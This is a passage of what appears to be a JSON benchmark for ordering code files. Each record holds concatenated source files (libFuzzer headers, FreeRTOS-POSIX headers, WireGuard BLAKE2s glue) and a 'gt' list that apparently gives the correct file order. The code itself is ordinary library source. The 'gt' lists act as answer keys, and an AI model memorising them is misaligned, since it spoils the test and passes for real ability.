        "content": "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerUtil.h'\n:\n\n\n\n\n\n\n\n\n\n#ifndef LLVM_FUZZER_UTIL_H\n#define LLVM_FUZZER_UTIL_H\n\n#include \"FuzzerBuiltins.h\"\n#include \"FuzzerBuiltinsMsvc.h\"\n#include \"FuzzerCommand.h\"\n#include \"FuzzerDefs.h\"\n\nnamespace fuzzer {\n\nvoid PrintHexArray(const Unit &U, const char *PrintAfter = \"\");\n\nvoid PrintHexArray(const uint8_t *Data, size_t Size,\n                   const char *PrintAfter = \"\");\n\nvoid PrintASCII(const uint8_t *Data, size_t Size, const char *PrintAfter = \"\");\n\nvoid PrintASCII(const Unit &U, const char *PrintAfter = \"\");\n\n\n\nbool ToASCII(uint8_t *Data, size_t Size);\n\nbool IsASCII(const Unit &U);\n\nbool IsASCII(const uint8_t *Data, size_t Size);\n\nstd::string Base64(const Unit &U);\n\nvoid PrintPC(const char *SymbolizedFMT, const char *FallbackFMT, uintptr_t PC);\n\nstd::string DescribePC(const char *SymbolizedFMT, uintptr_t PC);\n\nvoid PrintStackTrace();\n\nvoid PrintMemoryProfile();\n\nunsigned NumberOfCpuCores();\n\n\nvoid SetSignalHandler(const FuzzingOptions& Options);\n\nvoid SleepSeconds(int Seconds);\n\nunsigned long GetPid();\n\nsize_t GetPeakRSSMb();\n\nint ExecuteCommand(const Command &Cmd);\n\nFILE *OpenProcessPipe(const char *Command, const char *Mode);\n\nconst void *SearchMemory(const void *haystack, size_t haystacklen,\n                         const void *needle, size_t needlelen);\n\nstd::string CloneArgsWithoutX(const Vector<std::string> &Args,\n                              const char *X1, const char *X2);\n\ninline std::string CloneArgsWithoutX(const Vector<std::string> &Args,\n                                     const char *X) {\n  return CloneArgsWithoutX(Args, X, X);\n}\n\ninline std::pair<std::string, std::string> SplitBefore(std::string X,\n                                                       std::string S) {\n  auto Pos = S.find(X);\n  if (Pos == std::string::npos)\n    return std::make_pair(S, \"\");\n  return std::make_pair(S.substr(0, Pos), S.substr(Pos));\n}\n\nstd::string DisassembleCmd(const std::string &FileName);\n\nstd::string SearchRegexCmd(const std::string &Regex);\n\nsize_t SimpleFastHash(const uint8_t *Data, size_t Size);\n\ninline uint32_t Log(uint32_t X) { return 32 - Clz(X) - 1; }\n\ninline size_t PageSize() { return 4096; }\ninline uint8_t *RoundUpByPage(uint8_t *P) {\n  uintptr_t X = reinterpret_cast<uintptr_t>(P);\n  size_t Mask = PageSize() - 1;\n  X = (X + Mask) & ~Mask;\n  return reinterpret_cast<uint8_t *>(X);\n}\ninline uint8_t *RoundDownByPage(uint8_t *P) {\n  uintptr_t X = reinterpret_cast<uintptr_t>(P);\n  size_t Mask = PageSize() - 1;\n  X = X & ~Mask;\n  return reinterpret_cast<uint8_t *>(X);\n}\n\n}\n\n#endif\n\n'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerCommand.h'\n:\n\n\n\n\n\n\n\n\n\n\n#ifndef LLVM_FUZZER_COMMAND_H\n#define LLVM_FUZZER_COMMAND_H\n\n#include \"FuzzerDefs.h\"\n#include \"FuzzerIO.h\"\n\n#include <algorithm>\n#include <sstream>\n#include <string>\n#include <vector>\n\nnamespace fuzzer {\n\nclass Command final {\npublic:\n\n\n\n  static inline const char *ignoreRemainingArgs() {\n    return \"-ignore_remaining_args=1\";\n  }\n\n  Command() : CombinedOutAndErr(false) {}\n\n  explicit Command(const Vector<std::string> &ArgsToAdd)\n      : Args(ArgsToAdd), CombinedOutAndErr(false) {}\n\n  explicit Command(const Command &Other)\n      : Args(Other.Args), CombinedOutAndErr(Other.CombinedOutAndErr),\n        OutputFile(Other.OutputFile) {}\n\n  Command &operator=(const Command &Other) {\n    Args = Other.Args;\n    CombinedOutAndErr = Other.CombinedOutAndErr;\n    OutputFile = Other.OutputFile;\n    return *this;\n  }\n\n  ~Command() {}\n\n\n\n  bool hasArgument(const std::string &Arg) const {\n    auto i = endMutableArgs();\n    return std::find(Args.begin(), i, Arg) != i;\n  }\n\n\n\n  const Vector<std::string> &getArguments() const { return Args; }\n\n\n\n  void addArgument(const std::string &Arg) {\n    Args.insert(endMutableArgs(), Arg);\n  }\n\n\n\n  void addArguments(const Vector<std::string> &ArgsToAdd) {\n    Args.insert(endMutableArgs(), ArgsToAdd.begin(), ArgsToAdd.end());\n  }\n\n\n\n  void removeArgument(const std::string &Arg) {\n    auto i = endMutableArgs();\n    Args.erase(std::remove(Args.begin(), i, Arg), i);\n  }\n\n\n  bool hasFlag(const std::string &Flag) const {\n    std::string Arg(\"-\" + Flag + \"=\");\n    auto IsMatch = [&](const std::string &Other) {\n      return Arg.compare(0, std::string::npos, Other, 0, Arg.length()) == 0;\n    };\n    return std::any_of(Args.begin(), endMutableArgs(), IsMatch);\n  }\n\n\n\n\n  std::string getFlagValue(const std::string &Flag) const {\n    std::string Arg(\"-\" + Flag + \"=\");\n    auto IsMatch = [&](const std::string &Other) {\n      return Arg.compare(0, std::string::npos, Other, 0, Arg.length()) == 0;\n    };\n    auto i = endMutableArgs();\n    auto j = std::find_if(Args.begin(), i, IsMatch);\n    std::string result;\n    if (j != i) {\n      result = j->substr(Arg.length());\n    }\n    return result;\n  }\n\n\n  void addFlag(const std::string &Flag, const std::string &Value) {\n    addArgument(\"-\" + Flag + \"=\" + Value);\n  }\n\n\n  void removeFlag(const std::string &Flag) {\n    std::string Arg(\"-\" + Flag + \"=\");\n    auto IsMatch = [&](const std::string &Other) {\n      return Arg.compare(0, std::string::npos, Other, 0, Arg.length()) == 0;\n    };\n    auto i = endMutableArgs();\n    Args.erase(std::remove_if(Args.begin(), i, IsMatch), i);\n  }\n\n\n  bool hasOutputFile() const { return !OutputFile.empty(); }\n\n\n  const std::string &getOutputFile() const { return OutputFile; }\n\n\n  void setOutputFile(const std::string &FileName) { OutputFile = FileName; }\n\n\n  bool isOutAndErrCombined() const { return CombinedOutAndErr; }\n\n\n  void combineOutAndErr(bool combine = true) { CombinedOutAndErr = combine; }\n\n\n\n  std::string toString() const {\n    std::stringstream SS;\n    for (auto arg : getArguments())\n      SS << arg << \" \";\n    if (hasOutputFile())\n      SS << \">\" << getOutputFile() << \" \";\n    if (isOutAndErrCombined())\n      SS << \"2>&1 \";\n    std::string result = SS.str();\n    if (!result.empty())\n      result = result.substr(0, result.length() - 1);\n    return result;\n  }\n\nprivate:\n  Command(Command &&Other) = delete;\n  Command &operator=(Command &&Other) = delete;\n\n  Vector<std::string>::iterator endMutableArgs() {\n    return std::find(Args.begin(), Args.end(), ignoreRemainingArgs());\n  }\n\n  Vector<std::string>::const_iterator endMutableArgs() const {\n    return std::find(Args.begin(), Args.end(), ignoreRemainingArgs());\n  }\n\n\n  Vector<std::string> Args;\n\n\n  bool CombinedOutAndErr;\n\n\n  std::string OutputFile;\n};\n\n}\n\n#endif\n\n'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerDictionary.h'\n:\n\n\n\n\n\n\n\n\n\n#ifndef LLVM_FUZZER_DICTIONARY_H\n#define LLVM_FUZZER_DICTIONARY_H\n\n#include \"FuzzerDefs.h\"\n#include \"FuzzerIO.h\"\n#include \"FuzzerUtil.h\"\n#include <algorithm>\n#include <limits>\n\nnamespace fuzzer {\n\ntemplate <size_t kMaxSizeT> class FixedWord {\npublic:\n  static const size_t kMaxSize = kMaxSizeT;\n  FixedWord() {}\n  FixedWord(const uint8_t *B, uint8_t S) { Set(B, S); }\n\n  void Set(const uint8_t *B, uint8_t S) {\n    assert(S <= kMaxSize);\n    memcpy(Data, B, S);\n    Size = S;\n  }\n\n  bool operator==(const FixedWord<kMaxSize> &w) const {\n    return Size == w.Size && 0 == memcmp(Data, w.Data, Size);\n  }\n\n  static size_t GetMaxSize() { return kMaxSize; }\n  const uint8_t *data() const { return Data; }\n  uint8_t size() const { return Size; }\n\nprivate:\n  uint8_t Size = 0;\n  uint8_t Data[kMaxSize];\n};\n\ntypedef FixedWord<64> Word;\n\nclass DictionaryEntry {\n public:\n  DictionaryEntry() {}\n  DictionaryEntry(Word W) : W(W) {}\n  DictionaryEntry(Word W, size_t PositionHint) : W(W), PositionHint(PositionHint) {}\n  const Word &GetW() const { return W; }\n\n  bool HasPositionHint() const { return PositionHint != std::numeric_limits<size_t>::max(); }\n  size_t GetPositionHint() const {\n    assert(HasPositionHint());\n    return PositionHint;\n  }\n  void IncUseCount() { UseCount++; }\n  void IncSuccessCount() { SuccessCount++; }\n  size_t GetUseCount() const { return UseCount; }\n  size_t GetSuccessCount() const {return SuccessCount; }\n\n  void Print(const char *PrintAfter = \"\\n\") {\n    PrintASCII(W.data(), W.size());\n    if (HasPositionHint())\n      Printf(\"@%zd\", GetPositionHint());\n    Printf(\"%s\", PrintAfter);\n  }\n\nprivate:\n  Word W;\n  size_t PositionHint = std::numeric_limits<size_t>::max();\n  size_t UseCount = 0;\n  size_t SuccessCount = 0;\n};\n\nclass Dictionary {\n public:\n  static const size_t kMaxDictSize = 1 << 14;\n\n  bool ContainsWord(const Word &W) const {\n    return std::any_of(begin(), end(), [&](const DictionaryEntry &DE) {\n      return DE.GetW() == W;\n    });\n  }\n  const DictionaryEntry *begin() const { return &DE[0]; }\n  const DictionaryEntry *end() const { return begin() + Size; }\n  DictionaryEntry & operator[] (size_t Idx) {\n    assert(Idx < Size);\n    return DE[Idx];\n  }\n  void push_back(DictionaryEntry DE) {\n    if (Size < kMaxDictSize)\n      this->DE[Size++] = DE;\n  }\n  void clear() { Size = 0; }\n  bool empty() const { return Size == 0; }\n  size_t size() const { return Size; }\n\nprivate:\n  DictionaryEntry DE[kMaxDictSize];\n  size_t Size = 0;\n};\n\n\n\n\nbool ParseOneDictionaryEntry(const std::string &Str, Unit *U);\n\n\nbool ParseDictionaryFile(const std::string &Text, Vector<Unit> *Units);\n\n}\n\n#endif\n\n'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerMutate.h'\n:\n\n\n\n\n\n\n\n\n\n#ifndef LLVM_FUZZER_MUTATE_H\n#define LLVM_FUZZER_MUTATE_H\n\n#include \"FuzzerDefs.h\"\n#include \"FuzzerDictionary.h\"\n#include \"FuzzerOptions.h\"\n#include \"FuzzerRandom.h\"\n\nnamespace fuzzer {\n\nclass MutationDispatcher {\npublic:\n  MutationDispatcher(Random &Rand, const FuzzingOptions &Options);\n  ~MutationDispatcher() {}\n\n  void StartMutationSequence();\n\n  void PrintMutationSequence();\n\n  void RecordSuccessfulMutationSequence();\n\n  size_t Mutate_Custom(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_CustomCrossOver(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_ShuffleBytes(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_EraseBytes(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_InsertByte(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_InsertRepeatedBytes(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_ChangeByte(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_ChangeBit(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_CopyPart(uint8_t *Data, size_t Size, size_t MaxSize);\n\n\n  size_t Mutate_AddWordFromManualDictionary(uint8_t *Data, size_t Size,\n                                            size_t MaxSize);\n\n\n  size_t Mutate_AddWordFromTORC(uint8_t *Data, size_t Size, size_t MaxSize);\n\n\n  size_t Mutate_AddWordFromPersistentAutoDictionary(uint8_t *Data, size_t Size,\n                                                    size_t MaxSize);\n\n\n  size_t Mutate_ChangeASCIIInteger(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_ChangeBinaryInteger(uint8_t *Data, size_t Size, size_t MaxSize);\n\n\n  size_t Mutate_CrossOver(uint8_t *Data, size_t Size, size_t MaxSize);\n\n\n\n  size_t Mutate(uint8_t *Data, size_t Size, size_t MaxSize);\n\n\n\n\n  size_t MutateWithMask(uint8_t *Data, size_t Size, size_t MaxSize,\n                        const Vector<uint8_t> &Mask);\n\n\n\n  size_t DefaultMutate(uint8_t *Data, size_t Size, size_t MaxSize);\n\n\n  size_t CrossOver(const uint8_t *Data1, size_t Size1, const uint8_t *Data2,\n                   size_t Size2, uint8_t *Out, size_t MaxOutSize);\n\n  void AddWordToManualDictionary(const Word &W);\n\n  void PrintRecommendedDictionary();\n\n  void SetCrossOverWith(const Unit *U) { CrossOverWith = U; }\n\n  Random &GetRand() { return Rand; }\n\n private:\n  struct Mutator {\n    size_t (MutationDispatcher::*Fn)(uint8_t *Data, size_t Size, size_t Max);\n    const char *Name;\n  };\n\n  size_t AddWordFromDictionary(Dictionary &D, uint8_t *Data, size_t Size,\n                               size_t MaxSize);\n  size_t MutateImpl(uint8_t *Data, size_t Size, size_t MaxSize,\n                    Vector<Mutator> &Mutators);\n\n  size_t InsertPartOf(const uint8_t *From, size_t FromSize, uint8_t *To,\n                      size_t ToSize, size_t MaxToSize);\n  size_t CopyPartOf(const uint8_t *From, size_t FromSize, uint8_t *To,\n                    size_t ToSize);\n  size_t ApplyDictionaryEntry(uint8_t *Data, size_t Size, size_t MaxSize,\n                              DictionaryEntry &DE);\n\n  template <class T>\n  DictionaryEntry MakeDictionaryEntryFromCMP(T Arg1, T Arg2,\n                                             const uint8_t *Data, size_t Size);\n  DictionaryEntry MakeDictionaryEntryFromCMP(const Word &Arg1, const Word &Arg2,\n                                             const uint8_t *Data, size_t Size);\n  DictionaryEntry MakeDictionaryEntryFromCMP(const void *Arg1, const void *Arg2,\n                                             const void *Arg1Mutation,\n                                             const void *Arg2Mutation,\n                                             size_t ArgSize,\n                                             const uint8_t *Data, size_t Size);\n\n  Random &Rand;\n  const FuzzingOptions Options;\n\n\n  Dictionary ManualDictionary;\n\n\n  Dictionary TempAutoDictionary;\n\n\n  Dictionary PersistentAutoDictionary;\n\n  Vector<DictionaryEntry *> CurrentDictionaryEntrySequence;\n\n  static const size_t kCmpDictionaryEntriesDequeSize = 16;\n  DictionaryEntry CmpDictionaryEntriesDeque[kCmpDictionaryEntriesDequeSize];\n  size_t CmpDictionaryEntriesDequeIdx = 0;\n\n  const Unit *CrossOverWith = nullptr;\n  Vector<uint8_t> MutateInPlaceHere;\n  Vector<uint8_t> MutateWithMaskTemp;\n\n\n  Vector<uint8_t> CustomCrossOverInPlaceHere;\n\n  Vector<Mutator> Mutators;\n  Vector<Mutator> DefaultMutators;\n  Vector<Mutator> CurrentMutatorSequence;\n};\n\n}\n\n#endif\n",
        "gt": [
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerCommand.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerUtil.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerDictionary.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerMutate.h'"
        ]
    },
    {
        "files": [
            "'Lab-Project-FreeRTOS-POSIX/include/private/iot_doubly_linked_list.h'",
            "'Lab-Project-FreeRTOS-POSIX/FreeRTOS-Plus-POSIX/source/FreeRTOS_POSIX_sched.c'",
            "'Lab-Project-FreeRTOS-POSIX/FreeRTOS-Plus-POSIX/include/FreeRTOS_POSIX_internal.h'",
            "'Lab-Project-FreeRTOS-POSIX/FreeRTOS-Plus-POSIX/include/FreeRTOS_POSIX.h'"
        ],
        "content": "'Lab-Project-FreeRTOS-POSIX/include/private/iot_doubly_linked_list.h'\n:\n\n\n\n#ifndef _AWS_DOUBLY_LINKED_LIST_H_\n#define _AWS_DOUBLY_LINKED_LIST_H_\n\n#include <stddef.h>\n#include <stdint.h>\n\n\ntypedef struct Link\n{\n    struct Link * pxPrev;\n    struct Link * pxNext;\n} Link_t;\n\n\n#define listINIT_HEAD( pxHead )          \\\n    {                                    \\\n        ( pxHead )->pxPrev = ( pxHead ); \\\n        ( pxHead )->pxNext = ( pxHead ); \\\n    }\n\n\n#define listADD( pxHead, pxLink )                     \\\n    {                                                 \\\n        Link_t * pxPrevLink = ( pxHead );             \\\n        Link_t * pxNextLink = ( ( pxHead )->pxNext ); \\\n                                                      \\\n        ( pxLink )->pxNext = pxNextLink;              \\\n        pxNextLink->pxPrev = ( pxLink );              \\\n        pxPrevLink->pxNext = ( pxLink );              \\\n        ( pxLink )->pxPrev = ( pxPrevLink );          \\\n    }\n\n\n#define listREMOVE( pxLink )                                            \\\n    {                                                                   \\\n           \\\n        if( ( pxLink )->pxNext != NULL && ( pxLink )->pxPrev != NULL )  \\\n        {                                                               \\\n            ( pxLink )->pxPrev->pxNext = ( pxLink )->pxNext;            \\\n            ( pxLink )->pxNext->pxPrev = ( pxLink )->pxPrev;            \\\n        }                                                               \\\n                                                                        \\\n         \\\n        ( pxLink )->pxPrev = NULL;                                      \\\n        ( pxLink )->pxNext = NULL;                                      \\\n    }\n\n\n#define listIS_EMPTY( pxHead )    ( ( ( pxHead ) == NULL ) || ( ( pxHead )->pxNext == ( pxHead ) ) )\n\n\n#define listPOP( pxHead, pxLink )                                           \\\n    {                                                                       \\\n        if( listIS_EMPTY( ( pxHead ) ) )                                    \\\n        {                                                                   \\\n            ( pxLink ) = NULL;                                              \\\n        }                                                                   \\\n        else                                                                \\\n        {                                                                   \\\n            ( pxLink ) = ( pxHead )->pxNext;                                \\\n               \\\n            if( ( pxLink )->pxNext != NULL && ( pxLink )->pxPrev != NULL )  \\\n            {                                                               \\\n                ( pxLink )->pxPrev->pxNext = ( pxLink )->pxNext;            \\\n                ( pxLink )->pxNext->pxPrev = ( pxLink )->pxPrev;            \\\n            }                                                               \\\n                                                                            \\\n             \\\n            ( pxLink )->pxPrev = NULL;                                      \\\n            ( pxLink )->pxNext = NULL;                                      \\\n        }                                                                   \\\n    }\n\n\n#define listMERGE( pxHeadResultList, pxHeadListToMerge )                                     \\\n    {                                                                                        \\\n        if( !listIS_EMPTY( ( pxHeadListToMerge ) ) )                                         \\\n        {                                                                                    \\\n             \\\n            ( pxHeadListToMerge )->pxPrev->pxNext = ( pxHeadResultList )->pxNext;            \\\n            ( pxHeadResultList )->pxNext->pxPrev = ( pxHeadListToMerge )->pxPrev;            \\\n                                                                                             \\\n              \\\n            ( pxHeadListToMerge )->pxNext->pxPrev = ( pxHeadResultList );                    \\\n            ( pxHeadResultList )->pxNext = ( pxHeadListToMerge )->pxNext;                    \\\n                                                                 \\\n            listINIT_HEAD( ( pxHeadListToMerge ) );                                          \\\n        }                                                                                    \\\n    }\n\n\n#define listFOR_EACH( pxLink, pxHead )    \\\n    for( ( pxLink ) = ( pxHead )->pxNext; \\\n         ( pxLink ) != ( pxHead );        \\\n         ( pxLink ) = ( pxLink )->pxNext )\n\n\n#define listFOR_EACH_SAFE( pxLink, pxTempLink, pxHead )                        \\\n    for( ( pxLink ) = ( pxHead )->pxNext, ( pxTempLink ) = ( pxLink )->pxNext; \\\n         ( pxLink ) != ( pxHead );                                             \\\n         ( pxLink ) = ( pxTempLink ), ( pxTempLink ) = ( pxLink )->pxNext )\n\n\n#define listCONTAINER( pxLink, type, member )    ( ( type * ) ( ( uint8_t * ) ( pxLink ) - ( uint8_t * ) ( &( ( type * ) 0 )->member ) ) )\n\n#endif\n\n'Lab-Project-FreeRTOS-POSIX/FreeRTOS-Plus-POSIX/source/FreeRTOS_POSIX_sched.c'\n:\n\n\n\n\n#include \"FreeRTOS_POSIX.h\"\n#include \"FreeRTOS_POSIX/sched.h\"\n\n\n\nint sched_get_priority_max( int policy )\n{\n\n    ( void ) policy;\n\n    return configMAX_PRIORITIES - 1;\n}\n\n\n\nint sched_get_priority_min( int policy )\n{\n\n    ( void ) policy;\n\n    return tskIDLE_PRIORITY;\n}\n\n\n\nint sched_yield( void )\n{\n    taskYIELD();\n\n    return 0;\n}\n\n\n\n'Lab-Project-FreeRTOS-POSIX/FreeRTOS-Plus-POSIX/include/FreeRTOS_POSIX_internal.h'\n:\n\n#ifndef _FREERTOS_POSIX_INTERNAL_H_\n#define _FREERTOS_POSIX_INTERNAL_H_\n\n\n\n\n#include \"iot_doubly_linked_list.h\"\n\n\n#if posixconfigENABLE_PTHREAD_MUTEXATTR_T == 1\n    typedef struct pthread_mutexattr_internal\n    {\n        int iType;\n    } pthread_mutexattr_internal_t;\n#endif\n\n#if posixconfigENABLE_PTHREAD_MUTEX_T == 1\n\n\n    typedef struct pthread_mutex_internal\n    {\n        BaseType_t xIsInitialized;\n        StaticSemaphore_t xMutex;\n        TaskHandle_t xTaskOwner;\n        pthread_mutexattr_internal_t xAttr;\n    } pthread_mutex_internal_t;\n\n\n    #define FREERTOS_POSIX_MUTEX_INITIALIZER \\\n    ( ( ( pthread_mutex_internal_t )         \\\n    {                                        \\\n        .xIsInitialized = pdFALSE,           \\\n        .xMutex = { { 0 } },                 \\\n        .xTaskOwner = NULL,                  \\\n        .xAttr = { .iType = 0 }              \\\n    }                                        \\\n        )                                    \\\n    )\n#endif\n\n#if posixconfigENABLE_PTHREAD_COND_T == 1\n\n\n    typedef struct pthread_cond_internal\n    {\n        BaseType_t xIsInitialized;\n        StaticSemaphore_t xCondWaitSemaphore;\n        unsigned iWaitingThreads;\n    } pthread_cond_internal_t;\n\n\n\n    #define FREERTOS_POSIX_COND_INITIALIZER \\\n    ( ( ( pthread_cond_internal_t )         \\\n    {                                       \\\n        .xIsInitialized = pdFALSE,          \\\n        .xCondWaitSemaphore = { { 0 } },    \\\n        .iWaitingThreads = 0                \\\n    }                                       \\\n        )                                   \\\n    )\n\n#endif\n\n#if posixconfigENABLE_SEM_T == 1\n\n\n    typedef struct\n    {\n        StaticSemaphore_t xSemaphore;\n        int value;\n    } sem_internal_t;\n#endif\n\n#if posixconfigENABLE_PTHREAD_BARRIER_T == 1\n\n\n    typedef struct pthread_barrier_internal\n    {\n        unsigned uThreadCount;\n        unsigned uThreshold;\n        StaticSemaphore_t xThreadCountSemaphore;\n        StaticEventGroup_t xBarrierEventGroup;\n    } pthread_barrier_internal_t;\n#endif\n\n#endif\n\n'Lab-Project-FreeRTOS-POSIX/FreeRTOS-Plus-POSIX/include/FreeRTOS_POSIX.h'\n:\n\n\n\n#ifndef _FREERTOS_POSIX_H_\n#define _FREERTOS_POSIX_H_\n\n\n#include \"FreeRTOS_POSIX_portable.h\"\n#include \"FreeRTOS_POSIX_portable_default.h\"\n\n\n#include \"FreeRTOS.h\"\n#include \"event_groups.h\"\n#include \"semphr.h\"\n#include \"task.h\"\n\n\n#include \"FreeRTOS_POSIX/sys/types.h\"\n#include \"FreeRTOS_POSIX_internal.h\"\n\n#endif\n",
        "gt": [
            "'Lab-Project-FreeRTOS-POSIX/include/private/iot_doubly_linked_list.h'",
            "'Lab-Project-FreeRTOS-POSIX/FreeRTOS-Plus-POSIX/include/FreeRTOS_POSIX_internal.h'",
            "'Lab-Project-FreeRTOS-POSIX/FreeRTOS-Plus-POSIX/include/FreeRTOS_POSIX.h'",
            "'Lab-Project-FreeRTOS-POSIX/FreeRTOS-Plus-POSIX/source/FreeRTOS_POSIX_sched.c'"
        ]
    },
    {
        "files": [
            "'wireguard-linux-compat/src/crypto/zinc/blake2s/blake2s-x86_64-glue.c'",
            "'wireguard-linux-compat/src/compat/fpu-x86/include/asm/fpu/api.h'",
            "'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'",
            "'wireguard-linux-compat/src/crypto/zinc/blake2s/blake2s.c'"
        ],
        "content": "'wireguard-linux-compat/src/crypto/zinc/blake2s/blake2s-x86_64-glue.c'\n:\n\n\n#include <linux/simd.h>\n#include <asm/cpufeature.h>\n#include <asm/processor.h>\n#include <asm/fpu/api.h>\n\nasmlinkage void blake2s_compress_ssse3(struct blake2s_state *state,\n\t\t\t\t       const u8 *block, const size_t nblocks,\n\t\t\t\t       const u32 inc);\nasmlinkage void blake2s_compress_avx512(struct blake2s_state *state,\n\t\t\t\t\tconst u8 *block, const size_t nblocks,\n\t\t\t\t\tconst u32 inc);\n\nstatic bool blake2s_use_ssse3 __ro_after_init;\nstatic bool blake2s_use_avx512 __ro_after_init;\nstatic bool *const blake2s_nobs[] __initconst = { &blake2s_use_ssse3,\n\t\t\t\t\t\t  &blake2s_use_avx512 };\n\nstatic void __init blake2s_fpu_init(void)\n{\n\tblake2s_use_ssse3 = boot_cpu_has(X86_FEATURE_SSSE3);\n#ifndef COMPAT_CANNOT_USE_AVX512\n\tblake2s_use_avx512 =\n\t\tboot_cpu_has(X86_FEATURE_AVX) &&\n\t\tboot_cpu_has(X86_FEATURE_AVX2) &&\n\t\tboot_cpu_has(X86_FEATURE_AVX512F) &&\n\t\tboot_cpu_has(X86_FEATURE_AVX512VL) &&\n\t\tcpu_has_xfeatures(XFEATURE_MASK_SSE | XFEATURE_MASK_YMM |\n\t\t\t\t  XFEATURE_MASK_AVX512, NULL);\n#endif\n}\n\nstatic inline bool blake2s_compress_arch(struct blake2s_state *state,\n\t\t\t\t\t const u8 *block, size_t nblocks,\n\t\t\t\t\t const u32 inc)\n{\n\tsimd_context_t simd_context;\n\tbool used_arch = false;\n\n\n\tBUILD_BUG_ON(PAGE_SIZE / BLAKE2S_BLOCK_SIZE < 8);\n\n\tsimd_get(&simd_context);\n\n\tif (!IS_ENABLED(CONFIG_AS_SSSE3) || !blake2s_use_ssse3 ||\n\t    !simd_use(&simd_context))\n\t\tgoto out;\n\tused_arch = true;\n\n\tfor (;;) {\n\t\tconst size_t blocks = min_t(size_t, nblocks,\n\t\t\t\t\t    PAGE_SIZE / BLAKE2S_BLOCK_SIZE);\n\n\t\tif (IS_ENABLED(CONFIG_AS_AVX512) && blake2s_use_avx512)\n\t\t\tblake2s_compress_avx512(state, block, blocks, inc);\n\t\telse\n\t\t\tblake2s_compress_ssse3(state, block, blocks, inc);\n\n\t\tnblocks -= blocks;\n\t\tif (!nblocks)\n\t\t\tbreak;\n\t\tblock += blocks * BLAKE2S_BLOCK_SIZE;\n\t\tsimd_relax(&simd_context);\n\t}\nout:\n\tsimd_put(&simd_context);\n\treturn used_arch;\n}\n\n'wireguard-linux-compat/src/compat/fpu-x86/include/asm/fpu/api.h'\n:#include <asm/i387.h>\n\n'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'\n:\n\n\n#ifndef _WG_SIMD_H\n#define _WG_SIMD_H\n\n#include <linux/sched.h>\n#include <asm/simd.h>\n#if defined(CONFIG_X86_64)\n#include <asm/fpu/api.h>\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n#include <asm/neon.h>\n#endif\n\ntypedef enum {\n\tHAVE_NO_SIMD = 1 << 0,\n\tHAVE_FULL_SIMD = 1 << 1,\n\tHAVE_SIMD_IN_USE = 1 << 31\n} simd_context_t;\n\n#define DONT_USE_SIMD ((simd_context_t []){ HAVE_NO_SIMD })\n\nstatic inline void simd_get(simd_context_t *ctx)\n{\n\t*ctx = !IS_ENABLED(CONFIG_PREEMPT_RT) && !IS_ENABLED(CONFIG_PREEMPT_RT_BASE) && may_use_simd() ? HAVE_FULL_SIMD : HAVE_NO_SIMD;\n}\n\nstatic inline void simd_put(simd_context_t *ctx)\n{\n#if defined(CONFIG_X86_64)\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\tkernel_fpu_end();\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\tkernel_neon_end();\n#endif\n\t*ctx = HAVE_NO_SIMD;\n}\n\nstatic inline bool simd_relax(simd_context_t *ctx)\n{\n#ifdef CONFIG_PREEMPT\n\tif ((*ctx & HAVE_SIMD_IN_USE) && need_resched()) {\n\t\tsimd_put(ctx);\n\t\tsimd_get(ctx);\n\t\treturn true;\n\t}\n#endif\n\treturn false;\n}\n\nstatic __must_check inline bool simd_use(simd_context_t *ctx)\n{\n\tif (!(*ctx & HAVE_FULL_SIMD))\n\t\treturn false;\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\treturn true;\n#if defined(CONFIG_X86_64)\n\tkernel_fpu_begin();\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n\tkernel_neon_begin();\n#endif\n\t*ctx |= HAVE_SIMD_IN_USE;\n\treturn true;\n}\n\n#endif\n\n'wireguard-linux-compat/src/crypto/zinc/blake2s/blake2s.c'\n:\n\n\n#include <zinc/blake2s.h>\n#include \"../selftest/run.h\"\n\n#include <linux/types.h>\n#include <linux/string.h>\n#include <linux/kernel.h>\n#include <linux/module.h>\n#include <linux/init.h>\n#include <linux/bug.h>\n#include <asm/unaligned.h>\n\nstatic const u32 blake2s_iv[8] = {\n\t0x6A09E667UL, 0xBB67AE85UL, 0x3C6EF372UL, 0xA54FF53AUL,\n\t0x510E527FUL, 0x9B05688CUL, 0x1F83D9ABUL, 0x5BE0CD19UL\n};\n\nstatic const u8 blake2s_sigma[10][16] = {\n\t{ 0, 1, 2, 3, 4, 5, 6, 7, 8, 